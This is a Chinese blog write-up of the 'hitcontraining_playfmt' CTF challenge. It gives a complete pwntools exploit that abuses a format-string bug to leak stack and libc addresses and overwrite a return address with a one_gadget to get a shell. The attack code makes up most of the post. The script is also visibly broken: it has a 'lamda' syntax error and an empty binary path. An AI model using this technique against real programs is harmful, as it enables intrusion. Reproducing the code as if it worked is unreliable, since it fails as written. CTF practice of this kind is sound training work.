# hitcontraining_playfmt



### 题目分析
![image-20210608234859934](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210608234859934.png)

经典的堆的格式化字符串，找一个指针链作为跳板即可。直接上`exp`。这里我直接使用`ebp`指针链来攻击。

<!-- more -->

### 最终EXP

```python
from pwn import *

sh = process("./")
int16 = lambda x : int(x, base=16)
LOG_ADDR = lamda: x, y: log.info("Addr: {} ===> {}".format(x, y))

gadgets = [0x3a80c, 0x3a80e, 0x3a812, 0x3a919, 0x5f065, 0x5f066]
libc = ELF("libc-2.23.so")
context.arch="i386"

sh.recvlines(3)
sh.sendline("%6$p,%19$p")
msg = sh.recvline()

stack_addr, libc_addr = msg[:-1].split(b",")
stack_addr = int16(stack_addr.decode())
libc_addr = int16(libc_addr.decode())

LOG_ADDR("stack_addr", stack_addr)
LOG_ADDR("libc_addr", libc_addr)

libc.address = libc_addr - 247 - libc.sym['__libc_start_main']
LOG_ADDR("libc_base_addr", libc.address)

one_gadget = libc.offset_to_vaddr(gadgets[0])

# get ebp low addr
low_1_b = stack_addr & 0xff

# change ebp-->addr to retaddr
payload = "%{}c%6$hhn".format(low_1_b + 4).ljust(0x18, "a")
sh.sendline(payload)
sh.recv()
sleep(3)

# change retaddr to one_gadget
payload = "%{}c%10$hn".format(one_gadget & 0xffff).ljust(0x18, "a")
sh.sendline(payload)
sh.recv()
sleep(3)

# change ebp-->addr to retaddr (high addr)
payload = "%{}c%6$hhn".format(low_1_b + 4 + 2).ljust(0x10, "a")
sh.sendline(payload)
sh.recv()
sleep(3)

# change retaddr to one_gadget(high addr)
payload = "%{}c%10$hn".format((one_gadget >> 16) & 0xffff).ljust(0x18, "a")
sh.sendline(payload)
sh.recv()
sleep(3)

# recover ebp-->addr
payload = "%{}c%6$hhn".format(low_1_b + 0x10).ljust(0x18, "a")
sh.sendline(payload)
sh.recv()
sleep(3)

sh.sendline("quit")

sh.interactive()
```

远程打：

![image-20210608231717954](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210608231717954.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-06-02-hitcontraining-playfmt/  

